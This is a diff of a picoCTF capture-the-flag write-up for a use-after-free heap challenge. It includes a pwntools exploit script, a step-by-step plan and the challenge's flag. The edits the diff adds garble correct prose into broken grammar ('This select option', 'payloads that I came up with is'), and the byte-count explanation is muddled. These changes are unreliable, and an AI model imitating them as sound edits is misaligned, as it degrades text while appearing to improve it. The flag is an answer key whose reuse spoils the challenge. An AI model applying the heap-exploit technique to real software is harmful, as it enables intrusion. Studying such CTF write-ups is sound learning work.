@@ -9,7 +9,7 @@ pin: true
 ---
 
 ## Challenge Info
-This program mishandles memory. Can you exploit it to get the flag? Download the binary [here](https://artifacts.picoctf.net/c_tethys/5/chall). Download the source [here](https://artifacts.picoctf.net/c_tethys/5/chall.c).
+This program mishandles memory. Can you exploit it to get the flag? Downloads the binary [here](https://artifacts.picoctf.net/c_tethys/5/chall). Downloads the source [here](https://artifacts.picoctf.net/c_tethys/5/chall.c).
 
 Additional details will be available after launching your challenge instance.
 
@@ -172,8 +172,8 @@ Enter your choice:
 
 ## The Plan
 So, to exploit this program, we can leverage the UAF vulnerability that I previously discussed. If we combine this with heap allocation manipulation (via buffer overflow), we can overwrite a specific field in a freed structure (`x->flag`) with the string `"pico"`. This is how it would look like step by step:
-1. We select option `5` to **free x**.
-2. We select option `2` to **allocate** a new block of memory, which is likely to use the same memory area that `x` was previously occupying, because they're goingto have similar size requirements.
+1. This select option `5` to **free x**.
+2. This select option `2` to **allocate** a new block of memory, which is likely to use the same memory area that `x` was previously occupying, because they're goingto have similar size requirements.
     - The allocation size will be between 20 and 40, this way, we increase the likelihood that our new allocation will overlap with the previously freed `object` struct.
     - Recall that the `object` struct has 4 members, for a total of 35 bytes.
     ```c
@@ -184,12 +184,12 @@ So, to exploit this program, we can leverage the UAF vulnerability that I previo
   char flag[5]; // 5 bytes
 } object;
     ```
-3. While still in the "allocate object" option, we now input a payload string that will contain `"pico"` at the end to overwrite the previous `flag` value `"bico"`.
+3. While still in the "allocate object" option, we now input a payloads string that will contain `"pico"` at the end to overwrite the previous `flag` value `"bico"`.
 4. Select option 4 ("Check for win") and get our flag!
 
 ## Solution
 
-The [pwntools](https://docs.pwntools.com/en/stable/) payload that I came up with is as follows:
+The [pwntools](https://docs.pwntools.com/en/stable/) payloads that I came up with is as follows:
 
 ```py
 from pwn import *
@@ -200,13 +200,13 @@ r.sendline(b'5')
 r.sendline(b'2')
 
 r.sendline(b'40')
-payload = b'A' * 30 + b'pico'
+payloads = b'A' * 30 + b'pico'
 
 
-r.sendline(payload)
+r.sendline(payloads)
 r.sendline(b'4')
 r.interactive()
 ```
-All of the `r.sendline`'s are for selecting options in the interface. As for the actual payload, it consists of an initial 24 bytes (8 blocks of A's), and then a final block of 6 A's, and "pico"- for a total of 34 bytes. The reason we are inputting 34 bytes, rather than 35, is because the `flag` field in the `object` struct has a 5 byte space, due to the program accounting for a [null byte](https://null-byte.wonderhowto.com/newest/).
+All of the `r.sendline`'s are for selecting options in the interface. As for the actual payloads, it consists of an initial 24 bytes (8 blocks of A's), and then a final block of 6 A's, and "pico"- for a total of 34 bytes. The reason we are inputting 34 bytes, rather than 35, is because the `flag` field in the `object` struct has a 5 byte space, due to the program accounting for a [null byte](https://null-byte.wonderhowto.com/newest/).
 
 flag: `picoCTF{now_thats_free_real_estate_a7381726}`
